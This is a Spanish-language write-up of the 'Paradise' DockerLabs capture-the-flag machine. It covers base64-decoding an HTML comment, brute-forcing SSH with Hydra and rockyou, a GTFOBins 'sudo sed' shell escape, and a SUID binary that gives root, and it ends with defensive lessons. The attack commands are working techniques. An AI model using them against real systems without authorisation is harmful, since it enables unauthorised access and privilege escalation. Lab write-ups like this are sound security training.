# Paradise — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** kaikoperez  
**Fecha de creación:** 01/09/2024  
**Técnicas:** Base64 · Hydra · SSH · sudo sed abuse · SUID · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — directorio oculto](#2-enumeración-web--directorio-oculto)
3. [Fuerza bruta SSH — usuario lucas](#3-fuerza-bruta-ssh--usuario-lucas)
4. [Escalada de privilegios — usuario andy](#4-escalada-de-privilegios--usuario-andy)
5. [Escalada final a root](#5-escalada-final-a-root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh paradise.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

---

## 2. Enumeración web — directorio oculto

Accedemos al servidor web:

```text
Andy's House
```

Explorando la galería de imágenes encontramos un comentario oculto en el código fuente:

```html
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Utilizamos CyberChef o Base64 para decodificarlo.

Resultado:

```text
estoesunsecreto
```

Probamos el resultado como directorio:

```text
http://172.17.0.2/estoesunsecreto
```

Encontramos:

```text
mensaje_para_lucas.txt
```

Contenido:

```text
REMEMBER TO CHANGE YOUR PASSWORD ACCOUNT, BECAUSE YOUR PASSWORD IS DEBIL AND THE HACKERS CAN FIND USING B.F.
```

Ahora tenemos un posible usuario:

```text
lucas
```

---

## 3. Fuerza bruta SSH — usuario lucas

Realizamos fuerza bruta con Hydra:

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: lucas
password: chocolate
```

Accedemos:

```bash
ssh lucas@172.17.0.2
```

---

## 4. Escalada de privilegios — usuario andy

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(andy) NOPASSWD: /bin/sed
```

Consultamos GTFOBins y ejecutamos:

```bash
sudo -u andy /bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

Verificamos usuario:

```bash
whoami
andy
```

---

## 5. Escalada final a root

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Encontramos:

```text
/usr/local/bin/privileged_exec
/usr/local/bin/backup.sh
```

Ejecutamos:

```bash
/usr/local/bin/privileged_exec
```

Resultado:

```text
Running with effective UID: 0
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información oculta en comentarios HTML | Descubrimiento de directorios |
| Contraseña débil SSH | Acceso remoto |
| sudo sobre sed | Escalada horizontal |
| Binario SUID vulnerable | Escalada final a root |

**Para defenderse:**

- No ocultar información sensible en comentarios HTML.
- Aplicar políticas robustas de contraseñas.
- Restringir binarios peligrosos ejecutables mediante sudo.
- Auditar binarios SUID personalizados.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
